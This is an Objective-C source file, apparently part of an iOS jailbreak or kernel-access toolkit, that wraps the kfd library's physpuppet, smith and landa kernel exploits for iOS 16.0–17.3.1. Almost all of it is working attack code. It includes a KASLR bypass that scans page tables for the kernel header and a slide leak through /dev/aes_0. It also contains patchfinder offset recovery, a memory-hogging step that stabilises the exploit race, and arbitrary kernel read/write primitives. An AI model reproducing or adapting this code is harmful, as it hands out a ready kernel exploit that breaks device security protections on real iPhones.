//
//  ke_backend_kfd.m — krw backend over libkfd (opa334/Dopamine fork of
//  Félix Poulin-Bélanger's kfd, MIT), vendored under vendor/libkfd.
//
//  iOS 16.0 – 17.3.1 (arm64 + arm64e): the landa puaf plus the
//  kread_sem_open/kwrite_sem_open pair requires no kernelcache symbols.
//  The struct proc layout is derived at runtime inside the sem_open
//  find_proc (Serotonin-style), so no offsets table is needed.
//
//  iOS 15.x: kfd exploits do not apply; the ClearSword backend with a
//  per-build offsets table is the fallback.
//
#include "ke_internal.h"

#include <fcntl.h>
#include <os/proc.h>

#include "libkfd.h"
#include "patchfinder64.h"
#undef T1SZ_BOOT

u64 gKeKfdKernelProc = 0;
u64 gKeKfdCurrentProc = 0;
u64 gKeRuntimeProcPid = 0;
u64 gKeRuntimeProcTask = 0;
u64 gKeRuntimeProcObjectSize = 0;

static u64 g_kfd = 0;

#define KE_AES_LINK_ADDR 0xFFFFFFF007004000ULL

static size_t kePfKread(uint64_t kaddr, void *out, size_t size)
{
    u8 *p = (u8 *)out;
    u64 a = kaddr;
    size_t done = 0;
    while (done < size) {
        u64 v = 0;
        kread(g_kfd, a & ~7ULL, &v, sizeof(v));
        size_t chunk = 8 - (a & 7);
        if (chunk > size - done) chunk = size - done;
        memcpy(p + done, ((u8 *)&v) + (a & 7), chunk);
        a += chunk;
        done += chunk;
    }
    return done;
}

static u64 keKfdKread64(u64 kaddr)
{
    u64 v = 0;
    kread(g_kfd, kaddr, &v, sizeof(v));
    return v;
}

static u64 keKfdUnsign(u64 kaddr)
{
    u64 t1sz = ke_sem_t1sz();
    u64 ptrMask = (1ULL << (64 - t1sz)) - 1ULL;
    if (kaddr & (1ULL << 55)) return kaddr | ~ptrMask;
    return kaddr & ptrMask;
}

// Kaslr break (Serotonin): task -> vm_map(+0x28) -> pmap(+0x40) -> tte(+0x0),
// then scan pages for the kernel Mach-O header.
static u64 keKfdBreakKaslr(u64 taskKaddr, u64 *outSlide)
{
    u64 vmMap = keKfdKread64(taskKaddr + 0x28);
    if (!vmMap) return 0;
    u64 pmap = keKfdKread64(keKfdUnsign(vmMap) + 0x40);
    if (!pmap) return 0;
    u64 tte = keKfdUnsign(keKfdKread64(keKfdUnsign(pmap)));
    if (!tte) return 0;
    u64 page = tte & ~0xfffULL;
    for (int i = 0; i < 0x20000; i++) {
        u64 v = keKfdKread64(page);
        if (v == 0x0100000cfeedfacfULL) {
            u64 flags = 0;
            kread(g_kfd, page + 0x18, &flags, sizeof(flags));
            if (flags == 0 || flags == 0x200001) {
                *outSlide = page - KE_AES_LINK_ADDR;
                return page;
            }
        }
        page -= 0x1000;
    }
    return 0;
}

// vn_kqfilter slide via the /dev/aes_0 fileglob (kfd perf_run trick).
static u64 keKfdSlideViaAes(u64 *outSlide)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    int fd = open("/dev/aes_0", O_RDWR);
    if (fd < 0) return 0;
    u64 fdOfiles = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__p_fd__fd_ofiles);
    u64 fileproc = keKfdUnsign(fdOfiles) + ((u64)fd * sizeof(u64));
    u64 fpGlob = keKfdKread64(fileproc + 0x10);
    u64 fgOps = keKfdKread64(keKfdUnsign(fpGlob) + 0x28);
    u64 foKqfilter = keKfdKread64(keKfdUnsign(fgOps) + 0x30);
    close(fd);
    if (!(foKqfilter & 0xFFFF000000000000ULL)) return 0;
    *outSlide = keKfdUnsign(foKqfilter) - KE_AES_LINK_ADDR;
    return keKfdUnsign(foKqfilter);
}

static bool kePfOffsets(u64 slide, u64 kbase)
{
    auth_ptrs = true;
    monolithic_kernel = true;
    if (init_kernel(kePfKread, kbase, NULL) != 0) {
        KE_LOG("kfd: init_kernel failed");
        return false;
    }
    struct { const char *name; uint64_t (*fn)(void); u64 *dst; } items[] = {
        { "cdevsw",            find_cdevsw,            &dynamic_system_info.kernelcache__cdevsw },
        { "gPhysBase",         find_gPhysBase,         &dynamic_system_info.kernelcache__gPhysBase },
        { "gPhysSize",         find_gPhysSize,         &dynamic_system_info.kernelcache__gPhysSize },
        { "gVirtBase",         find_gVirtBase,         &dynamic_system_info.kernelcache__gVirtBase },
        { "perfmon_dev_open",  find_perfmon_dev_open,  &dynamic_system_info.kernelcache__perfmon_dev_open },
        { "perfmon_devices",   find_perfmon_devices,   &dynamic_system_info.kernelcache__perfmon_devices },
        { "ptov_table",        find_ptov_table,        &dynamic_system_info.kernelcache__ptov_table },
        { "vn_kqfilter",       find_vn_kqfilter,       &dynamic_system_info.kernelcache__vn_kqfilter },
    };
    bool ok = true;
    for (u64 i = 0; i < sizeof(items)/sizeof(items[0]); i++) {
        u64 absAddr = items[i].fn();
        if (!absAddr) {
            KE_LOG("kfd: patchfinder: %s not found", items[i].name);
            ok = false;
            break;
        }
        *items[i].dst = absAddr - slide;
        KE_LOG("kfd: %s = 0x%llx (static)", items[i].name, *items[i].dst);
    }
    term_kernel();
    return ok;
}

static bool keKfdBootstrapPerf(void)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    u64 slide = 0;
    u64 kbase = 0;
    if (!keKfdSlideViaAes(&slide)) {
        u64 task = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__task);
        if (!task) return false;
        kbase = keKfdBreakKaslr(task, &slide);
        if (!kbase) return false;
    } else {
        kbase = KE_AES_LINK_ADDR + slide;
    }
    u32 magic = 0;
    if (kePfKread(kbase, &magic, sizeof(magic)) != sizeof(magic) || magic != 0xfeedfacf) {
        KE_LOG("kfd: kernel base verification failed");
        return false;
    }

    dynamic_system_info.kernelcache__static_base = KE_AES_LINK_ADDR;

    u64 curTask = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__task);
    u64 curMap = keKfdKread64(curTask + 0x28);
    kfd->info.kaddr.current_pmap = keKfdKread64(keKfdUnsign(curMap) + 0x40);
    if (gKeKfdKernelProc) {
        u64 kTask = keKfdKread64(gKeKfdKernelProc + dynamic_system_info.proc__task);
        u64 kMap = keKfdKread64(kTask + 0x28);
        kfd->info.kaddr.kernel_pmap = keKfdKread64(keKfdUnsign(kMap) + 0x40);
    }
    if (!kfd->info.kaddr.current_pmap || !kfd->info.kaddr.kernel_pmap) {
        KE_LOG("kfd: pmap discovery failed");
        return false;
    }

    if (!kePfOffsets(slide, kbase)) {
        KE_LOG("kfd: patchfinder failed, staying in safe mode (no zero-writes)");
        return false;
    }
    dynamic_system_info.perf_supported = true;
    perf_run(kfd);
    if (kfd->kread.krkw_method_ops.kread != perf_kread) {
        dynamic_system_info.perf_supported = false;
        return false;
    }
    KE_LOG("kfd: perf krw active (clean arbitrary read/write)");
    return true;
}

static void keKfdFillDynamicInfoMinimal(void)
{
    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = false,
        .krkw_iosurface_supported = false,
        .perf_supported = false,
    };
}

static void keKfdSyncRuntimeGlobals(void)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    gKeKfdCurrentProc = kfd->info.kaddr.current_proc;
    gKeRuntimeProcPid = dynamic_system_info.proc__p_pid;
    gKeRuntimeProcTask = dynamic_system_info.proc__task;
    gKeRuntimeProcObjectSize = dynamic_system_info.proc__object_size;
}

//
// Memory hog before the PUAF grab (Serotonin do_kopen headroom logic):
// landa/smith grab free physical pages; without pre-hogging they can land
// on dyld shared cache pages and corrupt every running process (userland
// wide SIGBUS + shared_region_pager panic). Fill available RAM so the
// grab window only contains anonymous memory, then release right after.
//
static uint8_t *g_hogMemory = NULL;
static size_t g_hogMemorySize = 0;
// Serotonin-style memory hog: fill the jetsam allowance before the PUAF grab
// so landa cannot reclaim dyld shared-cache pages (shared_region_pager panic).
#define MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT 6
#define MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES 7

extern int memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize);

typedef struct {
    uint32_t memlimit_active;
    uint32_t memlimit_inactive;
} memorystatus_memlimit_properties_t;

typedef struct {
    memorystatus_memlimit_properties_t v1;
    int32_t memlimit_increase;
} memorystatus_memlimit_properties2_t;

static uint8_t *g_keHog = NULL;
static size_t g_keHogSize = 0;
static int32_t g_keOldMemLimit = 0;

static uint32_t keKfdAutoPuafPages(void)
{
    uint64_t memsize = 0;
    size_t size = sizeof(memsize);
    if (sysctlbyname("hw.memsize", &memsize, &size, NULL, 0) == 0 && memsize >= (5ULL << 30)) {
        return 2048;
    }
    return 512;
}

static void keKfdHogMemory(size_t headroomMB, uint32_t puafPages)
{
    // HOG POLICY (fixed for shared_region_pager panic):
    // Raising the jetsam limit to physical*2 and malloc-ing ALL available RAM
    // pushes the kernel into the shared-region pager reclaim path, which
    // panics on iOS 16.6 ("shared_region_pager_data_return"). Instead we
    // hog a bounded amount — just enough to shield the PUAF race window —
    // and never exceed the unmodified jetsam limit for this process.
    (void)headroomMB;
    size_t pagesize = (size_t)sysconf(_SC_PAGESIZE);
    size_t puafBytes = (size_t)puafPages * pagesize;
    // Shield budget: PUAF region + 256 MB of slack, capped at whatever is
    // actually available without touching the jetsam limit at all.
    size_t budget = puafBytes + (256ULL * 1024 * 1024);
    size_t memoryAvail = (size_t)os_proc_available_memory();
    if (memoryAvail <= budget) {
        KE_LOG("kfd: skipping memory hog (only %zu MB available)", memoryAvail >> 20);
        return;
    }
    g_keHogSize = budget;

    // NOTE: we do NOT raise the jetsam limit. That call is what triggers
    // shared_region_pager_data_return panics on iOS 16.5+.

    g_keHog = (uint8_t *)malloc(g_keHogSize);
    if (g_keHog) {
        memset(g_keHog, 0x41, g_keHogSize);
        KE_LOG("kfd: hogged %zu MiB", g_keHogSize >> 20);
    } else {
        g_keHogSize = 0;
    }
}

static void keKfdUnhogMemory(void)
{
    if (g_keHog) {
        free(g_keHog);
        g_keHog = NULL;
    }
    g_keHogSize = 0;
    if (g_keOldMemLimit) {
        memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, (int32_t)getpid(), (uint32_t)g_keOldMemLimit, NULL, 0);
        g_keOldMemLimit = 0;
    }
}

int keKfdInit(KEBackendID backend, const KEConfig *config)
{
    if (keEnv.major < 16) {
        return KE_ERR_UNSUPPORTED_VERSION;
    }

    u64 puafMethod;
    switch (backend) {
        case KE_BACKEND_KFD_PHYSPUPPET: puafMethod = puaf_physpuppet; break;
        case KE_BACKEND_KFD_SMITH:      puafMethod = puaf_smith;      break;
        case KE_BACKEND_KFD_LANDA:      puafMethod = puaf_landa;      break;
        default: return KE_ERR_INVALID_ARGUMENT;
    }

    keKfdFillDynamicInfoMinimal();
    gKeKfdKernelProc = 0;
    gKeKfdCurrentProc = 0;

    // landa + sem_open pair: no kernelcache symbols required at any step
    u64 kreadMethod = kread_sem_open;
    u64 kwriteMethod = kwrite_sem_open;

    uint32_t puafPages = config->puafPages ? config->puafPages : keKfdAutoPuafPages();

    keKfdHogMemory(1000, puafPages);
    g_kfd = kopen(puafPages, puafMethod, kreadMethod, kwriteMethod);
    if (!g_kfd) {
        keKfdUnhogMemory();
        return KE_ERR_EXPLOIT_FAILED;
    }
    keKfdSyncRuntimeGlobals();
    if (!gKeKfdCurrentProc || !gKeRuntimeProcObjectSize) {
        kclose(g_kfd);
        g_kfd = 0;
        keKfdUnhogMemory();
        return KE_ERR_OFFSETS_MISSING;
    }
    bool perf = keKfdBootstrapPerf();
    gKeKrwIsPerf = perf;
    keKfdUnhogMemory();
    if (!perf) {
        // Safe mode: reads work everywhere; zero-writes are refused upstream.
        // Without a clean write primitive, extmod zeroing stays disabled.
        KE_LOG("kfd: running in safe mode (perf krw unavailable)");
    }
    return KE_OK;
}

static int keKfdInitWrapper(const KEConfig *config) { return keKfdInit(KE_BACKEND_KFD_PHYSPUPPET, config); }
static int keKfdInitLanda(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_LANDA, config); }
static int keKfdInitSmith(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_SMITH, config); }

static void keKfdDeinit(void)
{
    if (g_kfd) {
        kclose(g_kfd);
        g_kfd = 0;
    }
    gKeKfdKernelProc = 0;
    gKeKfdCurrentProc = 0;
}

static uint8_t rd8(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint8_t)out; }
static uint16_t rd16(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint16_t)out; }
static uint32_t rd32(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint32_t)out; }

static void wr8(uint64_t where, uint8_t what) {
    u64 buf[1] = { 0 };
    ((uint8_t*)buf)[0] = what;
    ((uint8_t*)buf)[1] = rd8(where + 1);
    ((uint8_t*)buf)[2] = rd8(where + 2);
    ((uint8_t*)buf)[3] = rd8(where + 3);
    ((uint8_t*)buf)[4] = rd8(where + 4);
    ((uint8_t*)buf)[5] = rd8(where + 5);
    ((uint8_t*)buf)[6] = rd8(where + 6);
    ((uint8_t*)buf)[7] = rd8(where + 7);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr16(uint64_t where, uint16_t what) {
    u64 buf[1] = { 0 };
    ((uint16_t*)buf)[0] = what;
    ((uint16_t*)buf)[1] = rd16(where + 2);
    ((uint16_t*)buf)[2] = rd16(where + 4);
    ((uint16_t*)buf)[3] = rd16(where + 6);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr32(uint64_t where, uint32_t what) {
    u64 buf[1] = { 0 };
    ((uint32_t*)buf)[0] = what;
    ((uint32_t*)buf)[1] = rd32(where + 4);
    kwrite(g_kfd, buf, where, sizeof(u64));
}

static int keKfdReadBuf(uint64_t kaddr, void *out, size_t size)
{
    if (size == 1) { *(uint8_t*)out = rd8(kaddr); return 0; }
    if (size == 2) { *(uint16_t*)out = rd16(kaddr); return 0; }
    if (size == 4) { *(uint32_t*)out = rd32(kaddr); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kread(g_kfd, kaddr + start, ((uint8_t*)out) + start, chunk);
        }
    } else {
        kread(g_kfd, kaddr, out, size);
    }
    return 0;
}

static int keKfdWriteBuf(uint64_t kaddr, const void *in, size_t size)
{
    if (size == 1) { wr8(kaddr, *(const uint8_t*)in); return 0; }
    if (size == 2) { wr16(kaddr, *(const uint16_t*)in); return 0; }
    if (size == 4) { wr32(kaddr, *(const uint32_t*)in); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kwrite(g_kfd, (void*)((const uint8_t*)in) + start, kaddr + start, chunk);
        }
    } else {
        kwrite(g_kfd, (void*)in, kaddr, size);
    }
    return 0;
}

const KEBackendOps keBackendKfdPhyspuppet = {
    .name = "kfd/physpuppet", .id = KE_BACKEND_KFD_PHYSPUPPET,
    .init = keKfdInitWrapper, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdLanda = {
    .name = "kfd/landa", .id = KE_BACKEND_KFD_LANDA,
    .init = keKfdInitLanda, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdSmith = {
    .name = "kfd/smith", .id = KE_BACKEND_KFD_SMITH,
    .init = keKfdInitSmith, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};
